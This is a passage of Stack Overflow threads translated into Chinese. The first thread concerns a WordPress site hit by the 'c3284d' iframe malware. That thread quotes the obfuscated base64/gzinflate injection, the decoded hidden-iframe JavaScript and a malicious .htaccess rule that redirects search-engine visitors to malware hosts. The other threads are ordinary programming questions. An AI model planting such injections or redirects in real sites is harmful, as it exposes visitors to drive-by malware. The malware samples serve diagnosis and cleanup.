> 标签：php, iframe, code-injection

在过去的几天里，我的网站一再成为 iframe 攻击的目标。该代码主要附加到 PHP 和 Javascript 页面。然后代码是 PHP base 64 编码，参见示例（我稍微更改了代码以中和它）：

```
#c3284d#
echo(gzinflate(base64_decode("aJ1yhA3pkW4cWnUnmFluNmeq66wqE0OmVRcMUP3WQAupFZFGgaJvSE7IZH67z5S8    VwMxbWwg/TRkFvtPyCw9AGGzqRm8Qi/1LV6+9MdTtf9rtXb8e4L")));
#/c3284d# 
```

这个解码看起来像这样：

```
<script type="text/javascript">
    document.write(
        '<iframe src="http://opticmoxie.com/xxxxxxx.php"     
         name="Twitter" scrolling="auto" frameborder="no" 
         align="center" height="2" width="2"></iframe>'
    ); 
```

一个共同点是所有代码都有注释“#c3284d#”，因此追踪恶意代码并不困难。但是很费时间...

我们在 Gradwell（英国）的共享服务器上，它们并没有特别有用。所以问题是我能做些什么来阻止这个问题重演？我知道 MySQL 注入攻击并使用 PHP 的 mysql_real_escape_string 来防范此类攻击。

该站点是PHP和MySQL驱动器。我们使用 MySQLFTP 并拥有一个用于 SSH 访问的 shell 帐户。我们使用 Wordpress（已停用插件的最新更新）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-21T21:45:35.967

在我管理的所有 Wordpress 网站上都有同样的问题。没有找到感染源，我敢打赌它是我电脑上的一些蠕虫病毒，或者是我在所有网站上安装的一些插件。

我在 WP-Better 安全插件日志中发现了所有被修改的文件并删除了额外的受感染代码，并且在我对所有感染源的文件进行了 chmod 444 之后。

现在我自由了，因为 1 个月的邪恶 iframe/htacess 和其他东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-14T17:46:28.373

我遇到过同样的问题。FTP 服务器的访问日志显示修改是使用被黑的 FTP 密码进行的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-27T14:36:48.373

我有同样的问题，但进入了一个 Wordpress 网站。

我猜该网站是通过小部件感染的，因为我使用了一个允许执行 PHP 代码的插件。

我最好的解决方案是：

*   消除可疑小部件；
*   查看一个受感染文件的时间和日期（我的案例：header.php）；
*   清除所有受感染的文件（在我的情况下，我有网站的备份）；
*   在日志文件中搜索当时的可疑 IP（在黑名单中搜索找到的 IP）；
*   安装一个插件来禁止可疑IP。

从那一刻起，问题就消失了。我希望这能帮到您。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-02-03T23:28:03.783

我建议你看看这个：
[http](http://websiteprotection.blogspot.pt/2009/10/measures-to-prevent-and-detect-iframe.html)
://websiteprotection.blogspot.pt/2009/10/measures-to-prevent-and-detect-iframe.html它也有一个脚本来清理它。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-14T00:47:48.787

我有同样的问题，发现他们用来进入的方法是一个被黑的 ftp 密码。

尽管这是在启用了 CPHulk 暴力保护的 cPanel 服务器上运行的，但我发现黑客试图通过数千个不同的受感染主机暴力破解他们的方式。

幸运的是，我有所有上传文件的日志，所以我编写了一个脚本来从备份中恢复这些文件。

然后，我通过减少帐户被锁定之前所需的失败尝试次数来提高 cPanel 蛮力保护级别。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-19T22:07:19.070

我在许多不同的域上都有相同的问题和不同被黑文件的变体。我注意到的一件常见的事情是 Wordpress。我们在许多这些服务器上都有 wordpress，我认为这是常见的罪魁祸首。我已经更新了我所有的 wordpress 帐户，更改了所有域帐户的所有密码。不确定问题是否已经完全解决。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-07-11T17:56:33.540

我也有同样的问题。在我的情况下，附加代码是

```
<!--c3284d--><script type="text/javascript">
document.write('<iframe src="http://poseyhumane.org/stats.php" name="Twitter" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');
</script><!--/c3284d--> 
```

此外，还有一个 .htaccess 文件，如下所示：

```
> #c3284d# <IfModule mod_rewrite.c> RewriteEngine On RewriteCond %{HTTP_REFERER}
> ^.*(abacho|abizdirectory|about|acoon|alexana|allesklar|allpages|allthesites|alltheuk|alltheweb|altavista|america|amfibi|aol|apollo7|aport|arcor|ask|atsearch|baidu|bellnet|bestireland|bhanvad|bing|blog|bluewin|botw|brainysearch|bricabrac|browseireland|chapu|claymont|click4choice|clickey|clickz|clush|confex|cyber-content|daffodil|devaro|dmoz|dogpile|ebay|ehow|eniro|entireweb|euroseek|exalead|excite|express|facebook|fastbot|filesearch|findelio|findhow|finditireland|findloo|findwhat|finnalle|finnfirma|fireball|flemiro|flickr|freenet|friendsreunited|galaxy|gasta|gigablast|gimpsy|globalsearchdirectory|goo|google|goto|gulesider|hispavista|hotbot|hotfrog|icq|iesearch|ilse|infoseek|ireland-information|ixquick|jaan|jayde|jobrapido|kataweb|keyweb|kingdomseek|klammeraffe|km|kobala|kompass|kpnvandaag|kvasir|libero|limier|linkedin|live|liveinternet|lookle|lycos|mail|mamma|metabot|metacrawler|metaeureka|mojeek|msn|myspace|netscape|netzindex|nigma|nlsearch|nol9|oekoportal|openstat|orange|passagen|pocketflier|qp|qq|rambler|rtl|savio|schnellsuche|search|search-belgium|searchers|searchspot|sfr|sharelook|simplyhired|slider|sol|splut|spray|startpagina|startsiden|sucharchiv|suchbiene|suchbot|suchknecht|suchmaschine|suchnase|sympatico|telfort|telia|teoma|terra|the-arena|thisisouryear|thunderstone|tiscali|t-online|topseven|twitter|ukkey|uwe|verygoodsearch|vkontakte|voila|walhello|wanadoo|web|webalta|web-archiv|webcrawler|websuche|westaustraliaonline|wikipedia|wisenut|witch|wolong|ya|yahoo|yandex|yell|yippy|youtube|zoneru)\.(.*)
> RewriteRule ^(.*)$ http://onestopchinasource.com/catalog/stats.php
> [R=301,L] </IfModule>
> #/c3284d# 
```

我发现了两篇关于这个问题的文章： [http](http://www.webmasterworld.com/html/4472821.htm) ://www.webmasterworld.com/html/4472821.htm和[http://stopmalvertising.com/malware-reports/the-c3284d-malware-network-stats.php.html](http://stopmalvertising.com/malware-reports/the-c3284d-malware-network-stats.php.html)

希望能帮助到你

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2014-12-12T16:35:02.320

坏人可以访问您的代码，因此您必须关闭他们的访问权限，同时您可以使用一个简单的脚本来检查并删除它检测到 gzinflate 的所有行（base64_decode，但即使是最好的代码（带有备份文件的校验和检查器）如果他们仍然可以访问，那将毫无用处

# android - Android上的应用程序未安装错误

> ID：11427352
> 
> 赞同：-1
> 
> 时间：2012-07-11T07:08:41.000
> 
> 标签：android, apk

我一直在下载不同的 apk 文件并将它们放在我的 android 设备上没有问题。但是，有一个 apk 出现错误“未安装应用程序”。我已经尝试从互联网上下载不同版本的这个（甚至使用其他朋友使用过并为他们工作过的版本）。我似乎无法弄清楚为什么这个 ONE apk 文件会下载到我的手机上但不会安装。我不太了解所有这些“签名”和“未签名”业务，但我想如果我的朋友使用相同的完全相同的 apk，它应该可以工作。任何想法为什么这个应用程序让我如此头痛？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-12T10:22:50.693

好的，首先关于已签名和未签名的应用程序，已签名的应用程序有一个来自开发人员的特殊密钥，上面写着“这是来自官方开发人员的官方应用程序”，出于安全原因，未签名的应用程序通常不会安装。如果您从已签名的手机中收到“未安装应用程序”消息，则该应用程序不支持您的手机。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:11:51.420

您是否卸载了当前安装的应用程序版本？我注意到我的一些用户收到了这条消息，而且大多数时候它与已经安装了一个版本有关。我不确定 *this* 背后的真正原因，但它通常会有所帮助。

# sql-server - 无法访问 SSRS 中的报表管理器 URL

> ID：11427354
> 
> 赞同：0
> 
> 时间：2012-07-11T07:08:56.967
> 
> 标签：sql-server, reporting-services

我使用商业智能开发工作室 (BIDS) 开发了几个报表，但我无法部署它们。当我选择部署时，系统会要求我提供我的凭据。我不知道这些凭据是什么。

我已尝试访问 Report Manager URL 以查看是否可以设置这些凭据。这也要求提供凭据，但它允许我通过使用我的 Windows 帐户登录详细信息进入（这不适用于上述来自 BIDS 的部署）。但是 URL 打开时显示如下错误消息：

```
Parser Error 
Description: An error occurred during the parsing of a resource required to service this request. Please review the following specific parse error details and modify your source file appropriately. 

Parser Error Message: The type initializer for 'System.Web.UI.BaseParser' threw an exception.

Source Error: 

Line 1:  <%@ Page language="c#" Codebehind="Home.aspx.cs" AutoEventWireup="false" Inherits="Microsoft.ReportingServices.UI.HomePage" %>
Line 2:  <%@ Register TagPrefix="MSRS" Namespace="Microsoft.ReportingServices.UI" Assembly="ReportingServicesWebUserInterface" %>

Source File: /Reports_SQLE/home.aspx    Line: 1 
```

非常感激任何的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-27T14:20:20.683

最后我放弃了SSRS，选择了水晶报表

# php - 如何在循环中编写 PHP 并行 cURL 请求

> ID：11427356
> 
> 赞同：0
> 
> 时间：2012-07-11T07:08:58.020
> 
> 标签：php, for-loop, curl, parallel-processing, request

这是我编写的用于并行获取多个 URL 的代码：

```
$nodes = array($url1, $url2, $url3);
$node_count = count($nodes);

$curl_arr = array();
$master = curl_multi_init();

for($i = 0; $i < $node_count; $i++)
{
    $url =$nodes[$i];
    $curl_arr[$i] = curl_init($url);
    curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, true);
    curl_multi_add_handle($master, $curl_arr[$i]);
}

do {
    curl_multi_exec($master,$running);
} while($running > 0);

for($i = 0; $i < $node_count; $i++)
{
    $results[] = curl_multi_getcontent  ( $curl_arr[$i]  );
}
print_r($results); 
```

下面代码中的请求真的是并行发送的吗？

```
for($i = 0; $i < $node_count; $i++)
{
    $results[] = curl_multi_getcontent  ( $curl_arr[$i]  );
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:12:01.213

肯定长得像！

您也许可以从（或只是使用！）[这个 php async class](http://gonzalo123.wordpress.com/2010/10/11/speed-up-php-scripts-with-asynchronous-database-queries/)中获得一些技巧。

# c# - 如何解决 SqlConnection 错误“不支持关键字：'decr 池大小'。”

> ID：11427362
> 
> 赞同：1
> 
> 时间：2012-07-11T07:09:08.323
> 
> 标签：c#, sql, sql-server, ado.net

我正在创建 Windows 应用程序并使用 System.Data.SqlClient.SqlConnection 对象

```
 SqlConnection targetDatabaseConnection = new SqlConnection(ConnectionString); 
```

以下是连接字符串

```
Data Source=.;Initial Catalog=TestBCP_12;User ID=sa;Password=sa;Min Pool Size=100; Max Pool Size=100; Decr Pool Size=100; Incr Pool Size=100; 
```

以下两个设置出错

```
 Decr Pool Size=100; Incr Pool Size=100; 
```

我知道所有尺寸都是 100 ，如果是的话，这是异常的原因吗？，该消息不尊重错误。

我阅读了以下文章并基于它实现 [http://www.codeproject.com/Articles/17768/ADO-NET-Connection-Pooling-at-a-Glance](http://www.codeproject.com/Articles/17768/ADO-NET-Connection-Pooling-at-a-Glance)

找到了直接在 SQL 中不可能的答案，所以提出了新问题 [如何实现功能，即在建立与 SQL 的连接时控制“Incr Pool Size”或“Decr Pool Size”？类似于 ORACLE](https://stackoverflow.com/questions/11429562/how-to-achieve-functionlity-i-e-controlling-incr-pool-size-or-decr-pool-size) 来寻找其他可能的方法来实现它。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-11T07:14:18.023

由于您使用的是 SqlConnection，它不支持`Decr Pool Size`or `Incr Pool Size`。[OracleConnection](http://msdn.microsoft.com/en-us/library/system.data.oracleclient.oracleconnection%28v=vs.71%29.aspx)支持此属性

您可以查看这篇文章：[DotNet 中的连接池](http://www.programmersheaven.com/user/sreeharikv/blog/295-Connection-Pooling-in-DotNet/)

来自文章：

> 如果您使用的是 SQL Server 以外的 .NET 数据提供程序，则应参考文档。其他数据提供者可能有更多的汇集选项。一个很好的例子是 Oracle Data Provider，它提供了两个选项——Decr Pool Size 和 Incr Pool Size——用于控制连接池如何收缩或增长。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:16:45.917

接受的关键字列表[记录在 MSDN 上](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlconnection.connectionstring.aspx)。那里既没有`Decr Pool Size`也没有`Incr Pool Size`列出。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T07:17:43.487

您正在针对 SqlServer 数据库使用[Oracle 连接](http://docs.oracle.com/cd/B28359_01/win.111/b28375/featConnecting.htm)字符串的语法。

`DECR POOL SIZE`并且`INCR POOL SIZE`在 SqlServer 连接中不受支持。

只需从连接中删除这两个部分。
我还建议删除，`Max Pool Size=100;`因为这是默认值。
如果`Min Pool Size=100;`对初始最小尺寸没有特殊要求，也可以删除

# python - Python Tkinter：将带有空格的字符串插入Listbox时，出现括号

> ID：11427363
> 
> 赞同：1
> 
> 时间：2012-07-11T07:09:12.573
> 
> 标签：python, string, listbox, tkinter, listboxitem

由于某种原因，在列表框中似乎有括号围绕以空格结尾的字符串。

```
from Tkinter import *

def update_listbox():   
    for i in dic:
        listbox.insert(END, (i, dic[i][0], dic[i][1], dic[i][2]))

dic = {}
dic['Foods'] = ['apple','grape','pizza']
dic['Drinks      '] = ['milk','soda','jucie'] # How do i make the {} not show up but keep the spaces?

root=Tk()
listbox = Listbox(root)
button = Button(root,text='push',command=update_listbox)
button.pack()
listbox.pack()

root.mainloop() 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-11T08:26:22.333

我认为这与您将元组元素插入列表框而不是一个或多个字符串有关。试试这个：

```
listbox.insert(END, ' '.join([i]+dic[i]) 
```

它将键和所有子元素连接到一个字符串中 - 这也将它们全部放在一行上 - 并将那个单一的东西插入到列表框中。这是按下按钮后在我的系统上的样子：

![没有插入括号的列表框](../Images/b7607be2d9ad0c58e734e2f8176af560.png)

另一种选择是在调用中解包元组：

```
listbox.insert(END, *(i, dic[i][0], dic[i][1], dic[i][2])) 
```

或者，更好的是，首先不要将它们放在一个元组中：

```
listbox.insert(END, i, dic[i][0], dic[i][1], dic[i][2]) 
```

但甚至比这更好，因为它能够处理任何长度的列表（正如@mgilson 在评论中指出的那样）将是这样写的：

```
listbox.insert(END, i, *dic[i]) 
```

无论如何，结果将如下所示：

![另一个没有括号的列表框将每个单词插入单独的行](../Images/e93465e3c3754e1abb2cbe41fb356e17.png)

这是一种处理方式，因此列表框将在更新后自动更新其宽度。它还展示了另一种构建字典并稍后在填充列表框时迭代其内容的方法：

```
from Tkinter import *

def update_listbox():
    longest = 20  # initial value acts as minimum width
    for key,value in dic.iteritems():
        entry = '{}: {}'.format(key, (', '.join(value)))
        longest = max(longest, len(entry))
        listbox.insert(END, entry)
    listbox.config(width=longest)  # width in "standard" or average characters

dic = {
    'Foods': ['apple','grape','pizza'],
    'Drinks': ['milk','soda','juice'],
}

root=Tk()
root.title('Listbox')
listbox = Listbox(root)
button = Button(root, text='push', command=update_listbox)
button.pack()
listbox.pack()

root.mainloop() 
```

有了这个结果：

![列表框最终版本](../Images/be0b4af446034153113b591694e985d8.png)

顺便说一句，这是一个很好的[在线 Tkinter 参考](http://infohost.nmt.edu/tcc/help/pubs/tkinter/)。

# silverlight - 使用 silverlight 工具包 5 控件时出现异常

> ID：11427368
> 
> 赞同：3
> 
> 时间：2012-07-11T07:09:45.517
> 
> 标签：silverlight, toolkit

我正在开发一个基于 Silverlight 5 的应用程序。它的框架是 MVVM 并由 Prism 实现。我也在使用 silverlight 5 工具包。

在我的一个观点中，我使用了工具包中的 wrapPanel 和 DateTimePicker。

```
<navigation:Page x:Class="PIPM2.SupervisionSubSystem.Module.View.TestView"
           xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
           xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
           xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
           xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
           mc:Ignorable="d"
           xmlns:navigation="clr-namespace:System.Windows.Controls;assembly=System.Windows.Controls.Navigation"
           d:DesignWidth="640" d:DesignHeight="480"
           Title="TestView Page" xmlns:sdk="http://schemas.microsoft.com/winfx/2006/xaml/presentation/sdk" xmlns:toolkit="http://schemas.microsoft.com/winfx/2006/xaml/presentation/toolkit" xmlns:my="clr-namespace:Silverlight.Controls;assembly=Silverlight.Controls" xmlns:my1="clr-namespace:Silverlight.Controls.Primitives;assembly=Silverlight.Controls">
    <Grid>
        <sdk:DatePicker  />
        <toolkit:WrapPanel >
        </toolkit:WrapPanel>
    </Grid>
</navigation:Page> 
```

此示例构建成功，但在运行时在 InitializeComponent() 方法中我收到此错误 =>

```
Could not load file or assembly 'System.Windows.Controls.Toolkit, Version=5.0.5.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35' or one of its dependencies. The requested assembly version conflicts with what is already bound in the app domain or specified in the manifest. (Exception from HRESULT: 0x80131053) 
```

如果我删除其中一个控件、wrapPanel 或 DatePicker，则不会再次发生错误。

我怎么解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-12T14:41:48.727

您当前引用的 System.Windows.Controls.Toolkit 的确切版本是什么？你有多个项目吗？如果是这样，不同的项目是否引用同一程序集的不同版本？

如果您想确定您获得的是哪个版本的 DLL，只需转到您的 .XAP 文件并将其重命名为 .ZIP（XAP 文件实际上是 ZIP 文件）。现在查看 ZIP 文件并准确查看您拥有的 DLL 以及版本号。

# java - Android-如何使用 Jenkins 配置多配置项目？

> ID：11427369
> 
> 赞同：0
> 
> 时间：2012-07-11T07:09:48.997
> 
> 标签：java, android, testing, android-emulator, jenkins

我使用以下提示在 Jenkins（带有模拟器插件）上使用 Android 创建了一个多重配置项目：

> wiki.jenkins-ci.org/display/JENKINS/Android+Emulator+Plugin

和

> wiki.jenkins-ci.org/display/JENKINS/Building+an+Android+app+and+test+project

他们很有帮助，但我在成功运行我的项目时遇到了问题。当我查看控制台时，我只有这个：

```
Triggering 160,2.3.3,FWVGA
160,2.3.3,FWVGA completed with result FAILURE
Triggering 160,2.3.3,WVGA
160,2.3.3,WVGA completed with result NOT_BUILT
Triggering 160,2.2,FWVGA
160,2.2,FWVGA completed with result FAILURE 
```

但是当我收到电子邮件通知时，我会收到：

```
ERROR: Timeout after 5 seconds Process leaked file descriptors. See
http://wiki.jenkins-ci.org/display/JENKINS/Spawning+processes+from+build
for more information
$ "E:\server\Android SDK\android-sdk/platform-tools/adb.exe" connect localhost:38454
[android] Waiting for emulator to finish booting...
$ "E:\server\Android SDK\android-sdk/platform-tools/adb.exe" -s localhost:38454 shell getprop dev.bootcomplete
$ "E:\server\Android SDK\android-sdk/platform-tools/adb.exe" -s localhost:38454 logcat -v time
$ "E:\server\Android SDK\android-sdk/platform-tools/adb.exe" connect localhost:38454
[android] Emulator is ready for use (took 26 seconds) [QVGA]
$ cmd.exe /C '"E:\server\ant\bin\ant.bat -Dos=2.2 -Ddensity=169 -Dresolution=QVGA clean emma debug install test && exit %%ERRORLEVEL%%"' 

Buildfile:
 <.../jenkins/job/AndroidTestCalculatorTest3/./density=169,os=2.2,resolution=QVGA/ws/build.xml>

BUILD FAILED 
```

我从构建中阅读了带有生成过程的页面，但我不明白:(任何人都可以写“如何为白痴做这件事？”。

* * *

编辑：当我点击我拥有的第一个孩子时，我重新配置了我的项目：

> [android] 模拟器等待 180 秒后超时... [android] 停止 Android 模拟器有没有办法改变超时长度？

# zend-framework - 如何在zend布局中检查会话

> ID：11427375
> 
> 赞同：1
> 
> 时间：2012-07-11T07:10:31.990
> 
> 标签：zend-framework

布局.phtml：

```
<?php echo $this->doctype() ?>
<html>
<head>
    <?php echo $this->headTitle()."\n"; ?>
    <?php echo $this->headLink() ."\n"; ?>    
    <?php echo $this->headScript(); ?>
</head>
<body>
<div id="wrap">

       <div class="header">
            <div class="logo"><a href="index.html"><img src="../../images/logo.gif" alt="" title="" border="0" /></a></div>            
        <div id="menu">
            <ul>                                                                       
            <li class="selected"><a href="index.html">home</a></li>
            <li><a href="about.phtml">about us</a></li>
            <li><a href="category.phtml">books</a></li>
            <li><a href="specials.phtml">specials books</a></li>
            <li><a href="myaccount.phtml">my accout</a></li>
            <li><a href="register.phtml">register</a></li>
            <li><a href="details.phtml">prices</a></li>
            <li><a href="contact.phtml">contact</a></li>
            <li><a href="addbook.phtml">adddbook</a> </li>
            </ul>
        </div>     

       </div> 

       <div class="center_content">
        <div class="left_content">
       <?php echo $this->layout()->content ?> 
```

我是 zend 框架的新手，在这里我遇到了显示导航的问题。在纯 php 中，我可以通过检查会话来提供导航服务。像这样：

```
<?php 
if($_SESSION['usertype']=='admin')
{
echo "<li><a href="addbook.phtml">adddbook</a> </li>";
}

?> 
```

我的问题是如何在 zend 框架中实现它。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T11:48:19.897

您可以通过多种方式执行此操作，例如 Zend_Auth，但接近 $_SESSION 的方法是使用 Zend_Session。

首先，您需要在任何输出发送到浏览器**之前**启动 Zend_Session ，就像普通的 php 会话一样。设置完所有路径和自动加载器后，我在 index.php 中执行此操作。

```
Zend_Session::start(); 
```

下一步是为用户信息创建命名空间并向其中添加相关信息，最好是在您对用户进行身份验证时。

```
$userInfo = new Zend_Session_Namespace('userInfo');
$userInfo->userType = 'admin'; 
```

这相当于设置 $_SESSION['userInfo']['userType'] = 'admin';

最后，获取布局中的信息：

```
<?php 
$userInfo = new Zend_Session_Namespace('userInfo');
if($userInfo->userType=='admin')
{
    echo "<li><a href="addbook.phtml">addbook</a> </li>";
}
?> 
```

阅读此链接以获取更多信息[http://framework.zend.com/manual/en/zend.session.html](http://framework.zend.com/manual/en/zend.session.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:27:18.827

如果要检查用户角色，可以使用[`Zend_Auth`](http://framework.zend.com/manual/fr/zend.auth.adapter.dbtable.html)框架提供的类。您可以检查用户的凭据，然后将其影响为角色。

要检索此角色，您可以使用 Zend_Auth 实例检查用户的身份：

```
$identity = Zend_Auth::getInstance()->getIdentity();
if (strcmp($identity->role, "admin") == 0) {
    echo '<li><a href="addbook.phtml">adddbook</a> </li>';
} 
```

# ruby-on-rails - Mongoid：时间戳字符串的类型？

> ID：11427379
> 
> 赞同：7
> 
> 时间：2012-07-11T07:11:02.930
> 
> 标签：ruby-on-rails, mongoid

我想知道为什么当我想读出 created_at 日期时 mongoid 返回一个字符串？我的问题是：当我想像这样打印日期时

```
<% @app.created_at.strftime("%m/%d/%y") %> 
```

轨道正在提高

```
undefined method `getlocal' for "Wed, 11 Jul 2012 02:39:24 -0400":String 
```

错误。那么我该怎么做才能让 mongoid 将日期作为 Time 对象返回？

提前致谢！

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-08-03T18:56:51.193

您的模型是否包含

```
include Mongoid::Timestamps 
```

如果是， someObject.created_at.class 应该返回 Time

见[http://mongoid.org/en/mongoid/docs/extras.html#timestamps](http://mongoid.org/en/mongoid/docs/extras.html#timestamps)

# c - 根据字节序对整数进行位操作

> ID：11427380
> 
> 赞同：3
> 
> 时间：2012-07-11T07:11:06.840
> 
> 标签：c, bit-manipulation, endianness

我的问题涉及字节序变化时的位操作。特别是我有一些代码可以读取`uint32_t`值的各个位并对其执行位操作。目的是 UTF-8 编码。它非常适合我的小端机器。

最近重新访问代码时，我突然意识到，就`uint32_t`值的位表示而言，我并没有考虑机器的字节顺序。所以我对这方面有一些疑问。

让我们假设一个示例代码只需要`uint32_t`保存在不同字节中的位 7-10。

```
uint32_t v;
v = 18341;
char c = (v &(uint32_t) 0x3C0)>>6; 
```

对于 little endian，数字 18341 表示为`0x47A5` 或 二进制：

0100 01 **11 10** 10 0101

上面的代码应该给我们 1110 存储在 char

现在的问题是我们如何在 Big Endian 机器中实现这一点？相同的数字将以完全不同的方式表示`0xA5470000`或以二进制表示：

**10** 10 0101 0100 01 **11** 0000 0000 0000 0000

随着我们寻求的位处于完全不同的位置，甚至没有结果。

由于字节顺序不同，我们必须使用其他东西，而不是在**&**`0x3C0`的另一边使用。特别是因为我们需要一个字节的后续位，我们需要多个布尔**和**操作，如下右图？

 ****```
char c = ((v&(uint32_t)0xc0)>>6) | ((v&(uint32_t)0x300)>>6) 
```

加起来。我的理解是否正确，在我们需要获取以二进制表示的整数值的连续位的情况下，我们需要对两种字节序情况执行不同的操作？

最后，有没有比我上面展示的更好的方法来实现相同的目标？也许我错过了一些完全明显的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:16:21.750

否。如果您使用值（如 0x300）和语言运算符（<<、|、&），则无关紧要，因为值将根据机器表示。所以在你的情况下，你不需要担心这个问题。例如，当您将字节从文件复制到内存中时，您应该担心。

如果您直接处理内存表示，则可以在操作之前转换表示：

```
#if defined (BENDIAN)
   val = makelittle(val);
#endif
   manip_lendian(val);
#if defined (BENDIAN)
   val = makebig(val);
#endif 
```

另[请参阅此答案](https://stackoverflow.com/a/5643008/390913)****

# xmpp - 通过 xmpphp 邀请 gtalk 用户

> ID：11427381
> 
> 赞同：1
> 
> 时间：2012-07-11T07:11:08.783
> 
> 标签：xmpp, google-talk, xmpphp

我已经设置了 XMPPHP 的基本安装并对其进行测试，我尝试将消息从我的一个 gtalk (GoogleTalk) 帐户发送到另一个 gTalk 帐户。收款账号没有显示消息，或者正常的“用户*****给你发消息：accept/block”

然后，我从 Google 界面向我的接收帐户发送了一条聊天消息，它提示我（如预期的那样）将我的帐户添加到已批准的聊天人员列表中。

一旦我的发送帐户在“已批准”列表中，我就能够成功地使用 xmpphp 发送消息而没有问题。

我的问题：使用 xmpphp，我如何发送邀请聊天？一旦收件人接受我的传入聊天，我就可以正常发送消息，但发送的第一条消息不会触发聊天程序提示我接受消息。

作为后续行动……有没有办法查明收件人是否接受了请求？有什么方法可以知道消息正在传递（或不传递）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T13:29:14.523

我遇到了同样的问题，解决方案是在消息之前发送“订阅”请求。

所以只要打电话

```
$conn->subscribe('someguy@someserver.net'); 
```

前

```
$conn->message('someguy@someserver.net', 'This is a test message!'); 
```

# python - 使用 lxml 和 xpath 时出现奇怪的 python 错误

> ID：11427387
> 
> 赞同：0
> 
> 时间：2012-07-11T07:11:20.323
> 
> 标签：python, xpath, lxml

我正在使用 python 编写爬虫，因为我需要解析 html，所以我导入 lxml 但它出现了一个奇怪的错误：

```
<type 'dict'>
{'xpath': '//ul[@id="i-detail"]/li[1]', 'name': u'\u6807\u9898'}

<type 'dict'>
{'xpath': '//ul[@id="i-detail"]/li[1]', 'name': u'\u6807\u9898'}

<type 'dict'>   
{'xpath': '//ul[@id="i-detail"]/li[1]', 'name': u'\u6807\u9898'}
Exception in thread Thread-3:
Traceback (most recent call last):
  File     "/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/threading.py", line     522, in __bootstrap_inner
    self.run()
  File     "/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/threading.py", line     477, in run
    self.__target(*self.__args, **self.__kwargs)
  File "fetcher.py", line 78, in run
    self.extractContent(html)
  File "fetcher.py", line 151, in extractContent
    m = tree.xpath(c['xpath'])
AttributeError: 'NoneType' object has no attribute 'xpath'

<type 'dict'>
{'xpath': '//ul[@id="i-detail"]/li[1]', 'name': u'\u6807\u9898'} 
```

这是我的一段代码：

```
for c in self.contents:
  print type(c)
  print c
  m = tree.xpath(c['xpath']) 
```

请帮我解决这两个问题：

1.  为什么类型是`dict`但错误显示 NoneType ？

2.  我正在尝试匹配“树”中的某些内容，但它不起作用（该网站是在 GBK 下编码的，编码类型会导致这种问题吗？）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:18:39.147

1.  你得到一个`AttributeError`，这意味着它`tree`没有`xpath`属性，因为它已经成为`None`，而不是`c`没有`xpath`键，`KeyError`而是 a 。

    显然我们在这里遗漏了一些代码，其中`tree`设置为“无”。

2.  您没有打印`tree.xpath()`调用的结果，因此您的代码（在此处与我们共享）中没有任何内容可以打印`m`. 据我们所知，这些`tree.xpath()`电话可能工作正常。

在字里行间阅读并进行一些推测，您将`tree.xpath()`返回的结果分配给`tree`，并且您的 XPath 表达式不匹配任何内容并返回 None。下次进入循环时，您现在有`None`一个 代替`ElementTreeNode`，因此`xpath()`调用失败并显示一个`AttributeError`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:14:43.437

对于您的第一个问题，错误告诉您那`tree`是无，因为这就是您要读取的`xpath`属性。但是您打印的是 的类型`c`，而不是`tree`。

我不明白你在问第二个问题。

# php - 如何在没有 foreach 的情况下在 PHP 中使用键和值来内爆数组

> ID：11427398
> 
> 赞同：127
> 
> 时间：2012-07-11T07:11:53.140
> 
> 标签：php, arrays, string, implode

**没有 foreach**，我怎么能像这样转一个数组

```
array("item1"=>"object1", "item2"=>"object2",......."item-n"=>"object-n"); 
```

像这样的字符串

```
item1='object1', item2='object2',.... item-n='object-n' 
```

我已经考虑过`implode()`了，但它并没有用它来爆破钥匙。

如果需要foreach，是否可以不嵌套foreach？

**编辑：**我改变了字符串

* * *

**EDIT2/UPDATE：** 这个问题是很久以前提出的。那时，我想将所有内容写在一行中，因此我将使用三元运算符并嵌套内置函数调用以支持 foreach。那不是一个好习惯！编写可读的代码，是否简洁并不重要。

在这种情况下：将 foreach 放入函数中将比编写单行代码更具可读性和模块化（尽管所有答案都很棒！）。

* * *

## 回答 #1

> 赞同：225
> 
> 时间：2012-07-11T07:20:45.863

您可以使用[http_build_query](http://php.net/http_build_query)，如下所示：

```
<?php
  $a=array("item1"=>"object1", "item2"=>"object2");
  echo http_build_query($a,'',', ');
?> 
```

输出：

```
item1=object1, item2=object2 
```

[演示](http://codepad.viper-7.com/vfKClP)

* * *

## 回答 #2

> 赞同：205
> 
> 时间：2012-07-11T07:23:42.577

另一种方式：

```
$input = array(
    'item1'  => 'object1',
